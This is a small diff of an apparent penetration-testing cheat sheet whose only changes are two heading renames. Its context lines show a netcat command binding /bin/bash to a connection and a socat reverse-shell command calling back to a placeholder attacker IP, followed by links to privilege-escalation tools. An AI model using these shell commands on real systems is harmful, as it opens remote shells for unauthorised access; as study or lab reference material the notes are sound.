@@ -49,7 +49,7 @@ To connect to the listener:
 $ nc <target-ip> <chosen-port> -c /bin/bash
 ```
 
-### Socat
+### SoCat
 
 SoCat is like Netcat but on steroids
 
@@ -62,7 +62,7 @@ Open a connection from the target machine
 $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker machine ip>:<port>
 ```
 
-## Privilege Escalation
+## Linux Privilege Escalation
 
 - [GTFOBins](https://gtfobins.github.io/)
 - [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
